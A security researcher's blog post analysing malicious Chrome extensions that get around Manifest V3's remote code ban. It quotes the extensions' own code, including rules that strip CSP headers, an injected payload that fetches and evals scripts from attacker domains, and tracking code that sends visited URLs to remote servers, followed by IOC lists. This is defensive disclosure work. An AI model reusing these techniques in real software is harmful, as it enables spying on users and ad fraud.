---
url: https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/
captured_at: '2026-04-16'
capture_method: script
source_type: blog
source_id: palant
title_at_capture: Malicious extensions circumvent Google’s remote code ban | Almost Secure
author: Wladimir Palant
evidence_class: c
topics:
  - manifest-v3
  - remote-code
  - security
  - policy-enforcement
wayback_url: >-
  https://web.archive.org/web/20260416224436/https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/
related_docs: []
notes: Fill in during curation.
---

# Malicious extensions circumvent Google’s remote code ban | Almost Secure

## Signal extracted

<!-- Fill in during curation. The one insight this post has that's hard to get elsewhere. -->

---

As [noted last week](https://palant.info/2025/01/13/chrome-web-store-is-a-mess/#how-did-google-get-into-this-mess) I consider it highly problematic that Google for a long time allowed extensions to run code they downloaded from some web server, an approach that Mozilla prohibited long before Google even introduced extensions to their browser. For years this has been an easy way for malicious extensions to hide their functionality. When Google finally [changed their mind](https://developer.chrome.com/docs/extensions/develop/migrate/remote-hosted-code), it wasn’t in form of a policy but rather a technical change introduced with Manifest V3.

As with most things about Manifest V3, these changes are meant for well-behaving extensions where they in fact improve security. As readers of this blog probably know, those who want to find loopholes will find them: I’ve already written about the Honey extension [bundling its own JavaScript interpreter](https://palant.info/2020/10/28/what-would-you-risk-for-free-honey/#the-highly-flexible-promo-code-applying-process) and malicious extensions essentially [creating their own programming language](https://palant.info/2023/06/02/how-malicious-extensions-hide-running-arbitrary-code/). This article looks into more approaches I found used by malicious extensions in Chrome Web Store. And maybe Google will decide to prohibit remote code as a policy after all.

![Screenshot of a Google webpage titled “Deal with remote hosted code violations.” The page text visible in the screenshot says: Remotely hosted code, or RHC, is what the Chrome Web Store calls anything that is executed by the browser that is loaded from someplace other than the extension's own files. Things like JavaScript and WASM. It does not include data or things like JSON or CSS.](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/remote_code.png)

**Update** (2025-01-20): Added two extensions to the bonus section. Also indicated in the tables which extensions are currently featured in Chrome Web Store.

**Update** (2025-01-21): Got a sample of the malicious configurations for Phoenix Invicta extensions. Added [a section describing it](#the-payload) and removed “But what do these configurations actually do” section. Also added a bunch more domains to the [IOCs section](#iocs).

**Update** (2025-01-28): Corrected the “Netflix Party” section, Flipshope extension isn’t malicious after all. Also removed the attribution subsection here.

#### Contents

-   [Summary of the findings](#summary-of-the-findings)
-   [Phoenix Invicta](#phoenix-invicta)
    -   [Injecting HTML code into web pages](#injecting-html-code-into-web-pages)
    -   [Abusing declarativeNetRequest API](#abusing-declarativenetrequest-api)
    -   [Opening new tabs](#opening-new-tabs)
    -   [The scheme summarized](#the-scheme-summarized)
    -   [The payload](#the-payload)
    -   [Who is behind these extensions?](#who-is-behind-these-extensions)
    -   [The affected extensions](#the-affected-extensions)
-   [Netflix Party](#netflix-party)
    -   [Spying on the users](#spying-on-the-users)
    -   [The bogus rule processing](#the-bogus-rule-processing)
    -   [The affected extensions](#the-affected-extensions-1)
-   [Sweet VPN](#sweet-vpn)
    -   [Anti-debugging protection](#anti-debugging-protection)
    -   [Guessing further functionality](#guessing-further-functionality)
    -   [The affected extensions](#the-affected-extensions-2)
-   [Bonus section: more malicious extensions](#bonus-section-more-malicious-extensions)
    -   [The affected extensions](#the-affected-extensions-3)
-   [IOCs](#iocs)

## [](#summary-of-the-findings)Summary of the findings

This article originally started as an investigation into Phoenix Invicta Inc. Consequently, this is the best researched part of it. While I could attribute only 14 extensions with rather meager user numbers to Phoenix Invicta, that’s likely because they’ve only started recently. I could find a large number of domain names, most of which aren’t currently being used by any extensions. A few are associated with extensions that have been removed from Chrome Web Store but most seem to be reserved for future use.

It can be assumed that these extensions are meant to inject ads into web pages, yet Phoenix Invicta clearly put some thought into plausible deniability. They can always claim their execution of remote code to be a bug in their otherwise perfectly legitimate extension functionality. So it will be interesting to see how Google will deal with these extensions, lacking (to my knowledge) any policies that apply here.

The malicious intent is a bit more obvious with Netflix Party and related extensions. This shouldn’t really come as a surprise to Google: the most popular extension of the group was a topic on this blog back in 2023, and a year before that McAfee already flagged two extensions of the group as malicious. Yet here we are, and these extensions are still capable of spying, [affiliate fraud](https://www.investopedia.com/terms/a/affiliate-fraud.asp) and [cookie stuffing](https://en.wikipedia.org/wiki/Cookie_stuffing) as described by McAfee. If anything, their potential to do damage has only increased.

Finally, the group of extensions around Sweet VPN is the most obviously malicious one. To be fair, what these extensions do is probably best described as obfuscation rather than remote code execution. Still, they download extensive instructions from their web servers even though these aren’t too flexible in what they can do without requiring changes to the extension code. Again there is spying on the users and likely affiliate fraud as well.

In the following sections I will be discussing each group separately, listing the extensions in question at the end of each section. There is also a complete list of websites involved in downloading instructions [at the end of the article](#iocs).

## [](#phoenix-invicta)Phoenix Invicta

Let’s first take a look at an extension called “Volume Booster - Super Sound Booster.” It is one of several similar extensions and it is worth noting that the extension’s code is neither obfuscated nor minified. It isn’t hiding any of its functionality, relying on plausible deniability instead.

For example, in its manifest this extension requests access to all websites:

```
"host_permissions": [
  "http://*/*",
  "https://*/*"
],
```

Well, it _obviously_ needs that access because it might have to boost volume on any website. Of course, it would be possible to write this extension in a way that the `activeTab` permission would suffice. But it isn’t built in this way.

Similarly, one could easily write a volume booster extension that doesn’t need to download a configuration file from some web server. In fact, this extension works just fine with its default configuration. But it will still download its configuration roughly every six hours just in case (code slightly simplified for readability):

```
let res = await fetch(`https://super-sound-booster.info/shortcuts?uuid=${userId}`,{
    method: 'POST',
    body: JSON.stringify({installParams}),
    headers: { 'Content-Type': 'text/plain' }
});
let data = await res.json();
if (data.shortcuts) {
    chrome.storage.local.set({
        shortcuts: {
            list: data.shortcuts,
            updatedAt: Date.now(),
        }
    });
}
if (data.volumeHeaders) {
    chrome.storage.local.set({
        volumeHeaderRules: data.volumeHeaders
    });
}
if (data.newsPage) {
    this.openNewsPage(data.newsPage.pageId, data.newsPage.options);
}
```

This will send a unique user ID to a server which might then respond with a JSON file. Conveniently, the three possible values in this configuration file represent three malicious functions of the extensions.

### [](#injecting-html-code-into-web-pages)Injecting HTML code into web pages

The extension contains a default “shortcut” which it will inject into all web pages. It can typically be seen in the lower right corner of a web page:

![Screenshot of a web page footer with the Privacy, Terms and Settings links. Overlaying the latter is a colored diagonal arrow with a rectangular pink border.](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/shortcut1.png)

And if you move your mouse pointer to that button a message shows up:

![Screenshot of a web page footer. Overlaying it is a pink pop-up saying: To go Full-Screen, press F11 when watching a video.](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/shortcut2.png)

That’s it, it doesn’t do anything else. This “feature” makes no sense but it provides the extension with plausible deniability: it has a legitimate reason to inject HTML code into all web pages.

And of course that “shortcut” is remotely configurable. So the `shortcuts` value in the configuration response can define other HTML code to be injected, along with a regular expression determining which websites it should be applied to.

“Accidentally” this HTML code isn’t subject to the remote code restrictions that apply to browser extensions. After all, any JavaScript code contained here would execute in the context of the website, not in the context of the extension. While that code wouldn’t have access to the extension’s privileges, the end result is pretty much the same: it could e.g. spy on the user as they use the web page, transmit login credentials being entered, inject ads into the page and redirect searches to a different search engine.

### [](#abusing-declarativenetrequest-api)Abusing declarativeNetRequest API

There is only a slight issue here: a website might use a security mechanism called [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). And that mechanism can for example restrict what kind of scripts are allowed to run on the web site, in the same way the browser restricts the allowed scripts for the extension.

The extension solves this issue by abusing the immensely powerful [declarativeNetRequest API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/declarativeNetRequest). Looking at the extension manifest, a static rule is defined for this API:

```
[
    {
        "id": 1,
        "priority": 1,
        "action": {
            "type": "modifyHeaders",
            "responseHeaders": [
                { "header": "gain-id", "operation": "remove" },
                { "header": "basic-gain", "operation": "remove" },
                { "header": "audio-simulation-64-bit", "operation": "remove" },
                { "header": "content-security-policy", "operation": "remove" },
                { "header": "audio-simulation-128-bit", "operation": "remove" },
                { "header": "x-frame-options", "operation": "remove" },
                { "header": "x-context-audio", "operation": "remove" }
            ]
        },
        "condition": { "urlFilter": "*", "resourceTypes": ["main_frame","sub_frame"] }
    }
]
```

This removes a bunch of headers from all HTTP responses. Most headers listed here are red herrings – a `gain-id` HTTP header for example doesn’t really exist. But removing `Content-Security-Policy` header is meant to disable CSP protection on all websites. And removing `X-Frame-Options` header disables another security mechanism that might prevent injecting frames into a website. This probably means that the extension is meant to inject advertising frames into websites.

But these default `declarativeNetRequest` rules aren’t the end of the story. The `volumeHeaders` value in the configuration response allows adding more rules whenever the server decides that some are needed. As these rules aren’t code, the usual restrictions against remote code don’t apply here.

The name seems to suggest that these rules are all about messing with HTTP headers. And maybe this actually happens, e.g. adding cookie headers required for [cookie stuffing](https://en.wikipedia.org/wiki/Cookie_stuffing). But judging from other extensions the main point is rather preventing any installed ad blockers from blocking ads displayed by the extension. Yet these rules provide even more damage potential. For example, `declarativeNetRequest` allows “redirecting” requests which on the first glance is a very convenient way to perform [affiliate fraud](https://www.investopedia.com/terms/a/affiliate-fraud.asp). It also allows “redirecting” requests when a website loads a script from a trusted source, making it get a malicious script instead – another way to hijack websites.

_Side-note_: This abuse potential is the reason why legitimate ad blockers, while downloading their rules from a web server, never make these rules as powerful as the `declarativeNetRequest` API. It’s bad enough that a malicious rule could break the functionality of a website, but it shouldn’t be able to spy on the user for example.

### [](#opening-new-tabs)Opening new tabs

Finally, there is the `newsPage` value in the configuration response. It is passed to the `openNewsPage` function which is essentially a wrapper around [tabs.create() API](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/tabs/create). This will load a page in a new tab, something that extension developers typically use for benign things like asking for donations.

Except that Volume Booster and similar extensions don’t merely take a page address from the configuration but also some options. Volume Booster will take any options, other extensions will sometimes allow only specific options instead. One option that the developers of these extensions seem to particularly care about is `active` which allows opening tabs in background. This makes me suspect that the point of this feature is displaying pop-under advertisements.

### [](#the-scheme-summarized)The scheme summarized

There are many extensions similar to Volume Booster. The general approach seems to be:

1.  Make sure that the extension has permission to access all websites. Find a pretense why this is needed – or don’t, Google doesn’t seem to care too much.
2.  Find a reason why the extension needs to download its configuration from a web server. It doesn’t need to be convincing, nobody will ever ask why you couldn’t just keep that “configuration” in the extension.
3.  Use a part of that configuration in HTML code that the extension will inject in web pages. Of course you should “forget” to do any escaping or sanitization, so that HTML injection is possible.
4.  Feed another part of the configuration to `declarativeNetRequest` API. Alternatively (or additionally), use static rules in the extension that will remove pesky security headers from all websites, nobody will ask why you need that.

Not all extensions implement all of these points. With some of the extensions the malicious functionality seems incomplete. I assume that it isn’t being added all at once, instead the support for malicious configurations is added slowly to avoid raising suspicions. And maybe for some extensions the current state is considered “good enough,” so nothing is to come here any more.

### [](#the-payload)The payload

After I already published this article I finally got a sample of the malicious “shortcut” value, to be applied on all websites. Unsurprisingly, it had the form:

```
<img height="1" width="1" src="data:image/gif;base64,…"
     onload="(() => {…})();this.remove()">
```

This injects an invisible image into the page, runs some JavaScript code via its `load` event handler and removes the image again. The JavaScript code consists of two code blocks. The first block goes like this:

```
if (isGoogle() || isFrame()) {
    hideIt();
    const script = yield loadScript();
    if (script) {
        window.eval.call(window, script);
        window.gsrpdt = 1;
        window.gsrpdta = '_new'
    }
}
```

The `isGoogle` function looks for a Google subdomain and a query – this is about search pages. The `isFrame` function looks for frames but excludes “our frames” where the address contains all the strings `q=`, `frmid` and `gsc.page`. The `loadScript` function fetches a script from `https://shurkul[.]online/v1712/g1001.js`. This script then injects a hidden frame into the page, loaded either from `kralforum.com.tr` (Edge) or `rumorpix.com` (other browsers). There is also some tracking to an endpoint on `dev.astralink.click` but the main logic operating the frame is in the other code block.

The second code block looks like this (somewhat simplified for readability):

```
if (window.top == window.self) {
    let response = await fetch('https://everyview.info/c', {
        method: 'POST',
        body: btoa(unescape(encodeURIComponent(JSON.stringify({
            u: 'm5zthzwa3mimyyaq6e9',
            e: 'ojkoofedgcdebdnajjeodlooojdphnlj',
            d: document.location.hostname,
            t: document.title,
            'iso': 4
        })))),
        headers: {
            'Content-Type': 'text/plain'
        },
        credentials: 'include'
    });
    let text = await response.text();
    runScript(decodeURIComponent(escape(atob(text))));
} else {
    window.addEventListener('message', function(event) {
        event && event.data && event.data.boosterWorker &&
            event.data.booster && runScript(event.data.booster);
    });
}
```

So for top-level documents this downloads some script from `everyview.info` and runs it. That script in turn injects another script from `lottingem.com`. And that script loads some ads from `gulkayak.com` or `topodat.info` as well as Google ads, makes sure these are displayed in the frame and positions the frame above the search results. The result are ads which can be barely distinguished from actual search results, here is what I get searching for “amazon” for example:

![Screenshot of what looks like Google search results, e.g. a link titled “Amazon Produkte - -5% auf alle Produkte”. The website mentioned above it is conrad.de however rather than amazon.de.](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/ad_frame.png)

The second code block also has some additional tracking going to `doubleview.online`, `astato.online`, `doublestat.info`, `triplestat.online` domains.

The payloads I got for the Manual Finder 2024 and Manuals Viewer extensions are similar but not identical. In particular, these use `fivem.com.tr` domain for the frame. But the result is essentially the same: ads that are almost impossible to distinguish from the search results. In this screenshot the link at the bottom is a search result, the one above it is an ad:

![Screenshot of search results. Above a link titled “Amazon - Import US to Germany” with the domain myus.com. Below an actual Amazon.de link. Both have exactly the same visuals.](https://palant.info/2025/01/20/malicious-extensions-circumvent-googles-remote-code-ban/ad_frame2.png)

### [](#who-is-behind-these-extensions)Who is behind these extensions?

These extensions are associated with a company named Phoenix Invicta Inc, formerly Funteq Inc. While supposedly a US company of around 20 people, its terms of service claim to be governed by Hong Kong law, all while the company hires its employees in Ukraine. While it doesn’t seem to have any physical offices, the company offers its employees the use of two co-working spaces in Kyiv. To add even more confusion, Funteq Inc. was registered in the US with its “office address” being a two room apartment in Moscow.

Before founding this company in 2016 its CEO worked as CTO of something called Ormes.ru. Apparently, Ormes.ru was in the business of monetizing apps and browser extensions. Its sales pitches can still be found all over the web, offering extension developers to earn money with various kinds of ads. Clearly, there has been some competence transfer here.

Occasionally Phoenix Invicta websites will claim to be run by another company named Damiko Inc. Of course these claims don’t have to mean anything, as the same websites will also occasionally claim to be run by a company in the business of … _checks notes_ … selling knifes.

Yet Damiko Inc. is officially offering a number of extensions in the Chrome Web Store. And while these certainly aren’t the same as the Phoenix Invicta extensions, all but one of these extensions share certain similarities with them. In particular, these extensions remove the `Content-Security-Policy` HTTP header despite having no means of injecting HTML content into web pages from what I can tell.

Damiko Inc. appears to be a subsidiary of the Russian TomskSoft LLC, operating in the US under the name Tomsk Inc. How does this fit together? Did TomskSoft contract Phoenix Invicta to develop browser extensions for them? Or is Phoenix Invicta another subsidiary of TomskSoft? Or some other construct maybe? I don’t know. I asked TomskSoft for comment on their relationship with this company but haven’t received a response so far.

### [](#the-affected-extensions)The affected extensions

The following extensions are associated with Phoenix Invicta:

Name

Weekly active users

Extension ID

Featured

Click & Pick

20

acbcnnccgmpbkoeblinmoadogmmgodoo

AdBlock for Youtube: Skip-n-Watch

3,000

coebfgijooginjcfgmmgiibomdcjnomi

Dopni - Automatic Cashback Service

19

ekafoahfmdgaeefeeneiijbehnbocbij

SkipAds Plus

95

emnhnjiiloghpnekjifmoimflkdmjhgp

1-Click Color Picker: Instant Eyedropper (hex, rgb, hsl)

10,000

fmpgmcidlaojgncjlhjkhfbjchafcfoe

Better Color Picker - pick any color in Chrome

10,000

gpibachbddnihfkbjcfggbejjgjdijeb

Easy Dark Mode

869

ibbkokjdcfjakihkpihlffljabiepdag

Manuals Viewer

101

ieihbaicbgpebhkfebnfkdhkpdemljfb

ScreenCapX - Full Page Screenshot

20,000

ihfedmikeegmkebekpjflhnlmfbafbfe

Capture It - Easy Screenshot Tool (Full Page, Selected, Visible Area)

48

lkalpedlpidbenfnnldoboegepndcddk

AdBlock - Ads and Youtube

641

nonajfcfdpeheinkafjiefpdhfalffof

Manual Finder 2024

280

ocbfgbpocngolfigkhfehckgeihdhgll

Volume Booster - Super Sound Booster

8,000

ojkoofedgcdebdnajjeodlooojdphnlj

Font Expert: Identify Fonts from Images & Websites

666

pjlheckmodimboibhpdcgkpkbpjfhooe

The following table also lists the extensions officially developed by Damiko Inc. With these, there is no indication of malicious intent, yet all but the last one share similarities with Phoenix Invicta extensions above and remove security headers.

Name

Weekly active users

Extension ID

Featured

Screen Recorder

685

bgnpgpfjdpmgfdegmmjdbppccdhjhdpe

Halloween backgrounds and stickers for video calls and chats

31

fklkhoeemdncdhacelfjeaajhfhoenaa

AI Webcam Effects + Recorder: Google Meet, Zoom, Discord & Other Meetings

46

iedbphhbpflhgpihkcceocomcdnemcbj

✓

Beauty Filter

136

mleflnbfifngdmiknggikhfmjjmioofi

Background Noise Remover

363

njmhcidcdbaannpafjdljminaigdgolj

Camera Picture In Picture (PIP Overlay)

576

pgejmpeimhjncennkkddmdknpgfblbcl

## [](#netflix-party)Netflix Party

Back in 2023 I pointed out that [“Adblock all advertisements” is malicious and spying on its users](https://palant.info/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/#adblock-all-advertisments). A year earlier [McAfee already called out a bunch of extensions as malicious](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/malicious-cookie-stuffing-chrome-extensions-with-1-4-million-users/). For whatever reason, Google decided to let Adblock all advertisements stay, and three extensions from the McAfee article also remained in Chrome Web Store: Netflix Party, FlipShope and AutoBuy Flash Sales. Out of these three, Netflix Party and AutoBuy Flash Sales still (or again) contain malicious functionality.

**Update** (2025-01-28): This article originally claimed that FlipShope extension was also malicious and listed this extension cluster under the name of its developing company, Technosense Media. This was incorrect, the extension merely contained some recognizable but dead code. According to Technosense Media, they bought the extension in 2023. Presumably, the problematic code was introduced by the previous extension owner and is unused.

### [](#spying-on-the-users)Spying on the users

Coming back to Adblock all advertisements, it is still clearly spying on its users, using ad blocking functionality as a pretense to send the address of each page visited to its server (code slightly simplified for readability):

```
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if ("complete" === changeInfo.status) {
    let params = {
      url: tab.url,
      userId: await chrome.storage.sync.get("userId")
    };
    const response = await fetch("https://smartadblocker.com/extension/rules/api", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(params)
    });
    const rules = await response.json();
    …
  }
});
```

Supposedly, this code downloads a set of site-specific rules. This could in theory be legitimate functionality not meant to spy on users. That it isn’t legitimate functionality here isn’t indicated merely by the fact that the endpoint doesn’t produce any really meaningful responses. Legitimate functionality not intending to spy wouldn’t send a unique user ID with the request, the page address would be cut down to the host name (or would at least have all parameters removed) and the response would be cached. The latter would happen simply to reduce the load on this endpoint, something that anybody does unless the endpoint is paid for with users’ data.

### [](#the-bogus-rule-processing)The bogus rule processing

Nothing about the section above is new, I’ve already written as much in 2023. But either I haven’t taken a close look at the rule processing back then or it got considerably worse. Here is what it looks like today (variable and function naming is mine, the code was minified):

```
for (const key in rules)
  if ("id" === key || "genericId" === key)
    // Remove elements by ID
  else if ("class" === key || "genericClass" === key)
    // Remove elements by class name
  else if ("innerText" === key)
    // Remove elements by text
  else if ("rules" === key)
    if (rules.updateRules)
      applyRules(rules[key], rules.rule_scope, tabId);
  else if ("cc" === key)
    // Bogus logic to let the server decide which language-specific filter list
    // should be enabled
```

The interesting part here is the `applyRules` call which conveniently isn’t triggered by the initial server responses (`updateRules` key is set to `false`). This function looks roughly like this:

```
async function applyRules(rules, scope, tabId) {
  if ("global" !== scope) {
    if (0 !== rules.length) {
      const existingRules = await chrome.declarativeNetRequest.getDynamicRules();
      const ruleIds = existingRules.map(rule => rule.id);
      chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: ruleIds,
        addRules: rules
      });
    }
  } else {
    chrome.tabs.sendMessage(tabId, {
      message: "start",
      link: rules
    });
  }
}
```

So if the “scope” is anything but `"global"` the rules provided by the server will be added to the `declarativeNetRequest` API. Modifying these rules on per-request basis makes no sense for ad blocking, but it opens up rich possibilities for abuse [as we’ve seen already](#abusing-declarativenetrequest-api). Given what McAfee discovered about these extensions before this is likely meant for [cookie stuffing](https://en.wikipedia.org/wiki/Cookie_stuffing), yet execution of arbitrary JavaScript code in the context of targeted web pages is also a possible scenario.

And if the “scope” is `"global"` the extension sends a message to its content script which will inject a frame with the given address into the page. Again, this makes no sense whatsoever for blocking ads, but it definitely works for [affiliate fraud](https://www.investopedia.com/terms/a/affiliate-fraud.asp) – which is what these extensions are all about according to McAfee.

Depending on the extension there might be only frame injection or only adding of dynamic rules. Given the purpose of the AutoBuy extension, it can probably pass as legitimate by Google’s rules, others not so much.

### [](#the-affected-extensions-1)The affected extensions

Name

Weekly active users

Extension ID

Featured

Auto Refresh Plus

100,000

ffejlioijcokmblckiijnjcmfidjppdn

Smart Auto Refresh

100,000

fkjngjgmgbfelejhbjblhjkehchifpcj

✓

Adblock all advertisement - No Ads extension

700,000

gbdjcgalliefpinpmggefbloehmmknca

✓

AutoBuy Flash Sales, Deals, and Coupons

20,000

gbnahglfafmhaehbdmjedfhdmimjcbed

Autoskip for Youtube™ Ads

200,000

hmbnhhcgiecenbbkgdoaoafjpeaboine

Smart Adblocker

50,000

iojpcjjdfhlcbgjnpngcmaojmlokmeii

✓

Adblock for Browser

10,000

jcbjcocinigpbgfpnhlpagidbmlngnnn

Netflix Party

500,000

mmnbenehknklpbendgmgngeaignppnbe

Free adblocker

8,000

njjbfkooniaeodkimaidbpginjcmhmbm

✓

Video Ad Block Youtube

100,000

okepkpmjhegbhmnnondmminfgfbjddpb

✓

Picture in Picture for Videos

30,000

pmdjjeplkafhkdjebfaoaljknbmilfgo

**Update** (2025-01-28): Added Auto Refresh Plus and Picture in Picture for Videos to the list. The former only contains the spying functionality, the latter spying and frame injection.

## [](#sweet-vpn)Sweet VPN

I’ll be looking at Sweet VPN as representative for 32 extensions I found using highly obfuscated code. These extensions aren’t exactly new to this blog either, my post in 2023 already [named three of them](https://palant.info/2023/06/08/another-cluster-of-potentially-malicious-chrome-extensions/#the-affected-extensions) even though I couldn’t identify the malicious functionality back then. Most likely I simply overlooked it, I didn’t have time to investigate each extension thoroughly.

These extensions also decided to circumvent remote code restrictions but their approach is way more elaborate. They download some JSON data from the server and add it to the extension’s storage. While some keys like `proxy_list` are expected here and always present, a number of others are absent from the server response when the extension is first installed. These can contain malicious instructions.

### [](#anti-debugging-protection)Anti-debugging protection

For example, the four keys `0`, `1`, `2`, `3` seem to be meant for anti-debugging protection. If present, the values of these keys are concatenated and parsed as JSON into an array. A property resolution mechanism then allows resolving arbitrarily deep values, starting at the `self` object of the extension’s background worker. The result are three values which are used like this:

```
value1({value2: value3}, result => {
  …
});
```

This call is repeated every three seconds. If `result` is a non-empty array, the extension removes all but a few storage keys and stops further checks. This is clearly meant to remove traces of malicious activity. I am not aware of any ways for an extension to detect an open Developer Tools window, so this call is probably meant to detect the extension management page that Developer Tools are opened from:

```
chrome.tabs.query({"url": "chrome://extensions/*"}, result => {
  …
});
```

### [](#guessing-further-functionality)Guessing further functionality

This protection mechanism is only a very small part of the obfuscated logic in the extension. There are lots of values being decoded, tossed around, used in some function calls. It is difficult to reconstruct the logic with the key parts missing. However, the extension doesn’t have too many permissions:

```
"permissions": [
  "proxy",
  "storage",
  "tabs"
],
"host_permissions": [
  "https://ipapi.co/json/",
  "https://ip.seeip.org/geoip",
  "https://api.myip.com/",
  "https://ifconfig.co/json"
],
```

Given that almost no websites can be accessed directly, it’s a safe bet that the purpose of the concealed functionality is spying on the users. That’s what the `tabs` permission is for, to be notified of any changes in the user’s browsing session.

In fact, once you know that the function being passed as parameter is a `tabs.onUpdated` listener its logic becomes way easier to understand, despite the missing parts. So the `cl` key in the extension’s storage (other extensions often use other names) is the event queue where data about the user’s browsing is being stored. Once there are at least 10 events the queue is sent to the same address where the extension downloads its configuration from.

There are also some `chrome.tabs.update()` calls in the code, replacing the address of the currently loading page by something else. It’s hard to be certain what these are used for: it could be search redirection, affiliate fraud or plainly navigating to advertising pages.

### [](#the-affected-extensions-2)The affected extensions

Name

Weekly active users

Extension ID

Featured

VK UnBlock. Works fast.

40,000

ahdigjdpekdcpbajihncondbplelbcmo

VPN Proxy Master

120

akkjhhdlbfibjcfnmkmcaknbmmbngkgn

VPN Unblocker for Instagram

8,000

akmlnidakeiaipibeaidhlekfkjamgkm

StoriesHub

100,000

angjmncdicjedpjcapomhnjeinkhdddf

✓

Facebook and Instagram Downloader

30,000

baajncdfffcpahjjmhhnhflmbelpbpli

Downloader for Instagram - ToolMaster

100,000

bgbclojjlpkimdhhdhbmbgpkaenfmkoe

✓

TikTok in USA

20,000

bgcmndidjhfimbbocplkapiaaokhlcac

✓

Sweet VPN

100,000

bojaonpikbbgeijomodbogeiebkckkoi

✓

Access to Odnoklassniki

4,000

ccaieagllbdljoabpdjiafjedojoejcl

Ghost - Anonymous Stories for Instagram

20,000

cdpeckclhmpcancbdihdfnfcncafaicp

✓

StorySpace Manager for FB and IG Stories

10,000

cicohiknlppcipjbfpoghjbncojncjgb

✓

VPN Unblocker for YouTube

40,000

cnodohbngpblpllnokiijcpnepdmfkgm

Universal Video Downloader

200,000

cogmkaeijeflocngklepoknelfjpdjng

✓

Free privacy connection - VPN guru

500,000

dcaffjpclkkjfacgfofgpjbmgjnjlpmh

✓

Live Recorder for Instagram aka MasterReco

10,000

djngbdfelbifdjcoclafcdhpamhmeamj

Video Downloader for Vimeo

100,000

dkiipfbcepndfilijijlacffnlbchigb

✓

VPN Ultimate - Best VPN by unblock

400,000

epeigjgefhajkiiallmfblgglmdbhfab

✓

Insured Smart VPN - Best Proxy ever unblock everything

2,000

idoimknkimlgjadphdkmgocgpbkjfoch

Ultra Downloader for Instagram

30,000

inekcncapjijgfjjlkadkmdgfoekcilb

✓

Parental Control. Blocks porn, malware, etc.

3,000

iohpehejkbkfdgpfhmlbogapmpkefdej

✓

UlV. Ultimate downloader for Vimeo

2,000

jpoobmnmkchgfckdlbgboeaojhgopidn

Simplify. Downloader for Instagram

20,000

kceofhgmmjgfmnepogjifiomgojpmhep

✓

Download Facebook Video

591

kdemfcffpjfikmpmfllaehabkgkeakak

VPN Unblocker for Facebook

3,000

kheajjdamndeonfpjchdmkpjlemlbkma

Video Downloader for FaceBook

90,000

kjnmedaeobfmoehceokbmpamheibpdjj

✓

TikTok Video Keeper

40,000

kmobjdioiclamniofdnngmafbhgcniok

✓

Mass Downloader for Instagram

100,000

ldoldiahbhnbfdihknppjbhgjngibdbe

✓

Stories for FaceBook - Anon view, download

3,000

nfimgoaflmkihgkfoplaekifpeicacdn

✓

VPN Surf - Fast VPN by unblock

800,000

nhnfcgpcbfclhfafjlooihdfghaeinfc

✓

TikTok Video Downloader

20,000

oaceepljpkcbcgccnmlepeofkhplkbih

Video Downloader for FaceBook

10,000

ododgdnipimbpbfioijikckkgkbkginh

Exta: Pro downloader for Instagram

10,000

ppcmpaldbkcoeiepfbkdahoaepnoacgd

✓

## [](#bonus-section-more-malicious-extensions)Bonus section: more malicious extensions

**Update** (2025-01-20): Added Adblock Bear and AdBlock 360 after a [hint from a commenter](#c000001).

As is often the case with Chrome Web Store, my searches regularly turned up more malicious extensions unrelated to the ones I was looking for. Some of them also devised their mechanisms to execute remote code. I didn’t find more extensions using the same approach, which of course doesn’t mean that there are none.

Adblock for Youtube is yet another browser extension essentially bundling an interpreter for their very own minimalistic programming language. One part of the instructions it receives from its server is executed in the context of the privileged background worker, the other in the content script context.

EasyNav, Adblock Bear and AdBlock 360 use an approach quite similar to Phoenix Invicta. In particular, they add rules to the `declarativeNetRequest` API that they receive from their respective server. EasyNav also removes security headers. These extensions don’t bother with HTML injection however, instead their server produces a list of scripts to be injected into web pages. There are specific scripts for some domains and a fallback for everything else.

Download Manager Integration Checklist is merely supposed to display some instructions, it shouldn’t need any privileges at all. Yet this extension requests access to all web pages and will add rules to the `declarativeNetRequest` API that it downloads from its server.

Translator makes it look like its configuration is all about downloading a list of languages. But it also contains a regular expression to test against website addresses and the instructions on what to do with matching websites: a tag name of the element to create and a bunch of attributes to set. Given that the element isn’t removed after insertion, this is probably about injecting advertising frames. This mechanism could just as well be used to inject a script however.

### [](#the-affected-extensions-3)The affected extensions

Name

Weekly active users

Extension ID

Featured

Adblock for Youtube™ - Auto Skip ad

8,000

anceggghekdpfkjihcojnlijcocgmaoo

✓

EasyNav

30,000

aobeidoiagedbcogakfipippifjheaom

Adblock Bear - stop invasive ads

100,000

gdiknemhndplpgnnnjjjhphhembfojec

AdBlock 360

400,000

ghfkgecdjkmgjkhbdpjdhimeleinmmkl

Download Manager Integration Checklist

70,000

ghkcpcihdonjljjddkmjccibagkjohpi

✓

Translator

100,000

icchadngbpkcegnabnabhkjkfkfflmpj

## [](#iocs)IOCs

The following domain names are associated with Phoenix Invicta:

-   1-click-cp\[.\]com
-   adblock-ads-and-yt\[.\]pro
-   agadata\[.\]online
-   anysearch\[.\]guru
-   anysearchnow\[.\]info
-   astatic\[.\]site
-   astato\[.\]online
-   astralink\[.\]click
-   best-browser-extensions\[.\]com
-   better-color-picker\[.\]guru
-   betterfind\[.\]online
-   capture-it\[.\]online
-   chrome-settings\[.\]online
-   click-and-pick\[.\]pro
-   color-picker-quick\[.\]info
-   customcursors\[.\]online
-   dailyview\[.\]site
-   datalocked\[.\]online
-   dmext\[.\]online
-   dopni\[.\]com
-   doublestat\[.\]info
-   doubleview\[.\]online
-   easy-dark-mode\[.\]online
-   emojikeyboard\[.\]site
-   everyview\[.\]info
-   fasterbrowser\[.\]online
-   fastertabs\[.\]online
-   findmanual\[.\]org
-   fivem\[.\]com\[.\]tr
-   fixfind\[.\]online
-   font-expert\[.\]pro
-   freestikers\[.\]top
-   freetabmemory\[.\]online
